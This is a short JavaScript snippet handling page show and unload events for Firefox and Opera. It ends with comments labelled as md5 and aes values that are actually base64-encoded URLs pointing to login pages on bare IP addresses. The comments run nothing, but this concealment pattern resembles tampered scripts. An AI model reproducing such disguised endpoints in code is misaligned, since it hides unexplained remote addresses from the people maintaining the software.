if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3LjEwOS44OC4xMDc6ODAwOC8jL2xvZ2luL2xvZ2luLGh0dHA6Ly80Ny4xMDguMTMwLjU5OjgwMDgvIy9sb2dpbi9sb2dpbixodHRwOi8vMTE0LjU1LjM2LjEyMzo4MDA4LyMvbG9naW4vbG9naW4=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/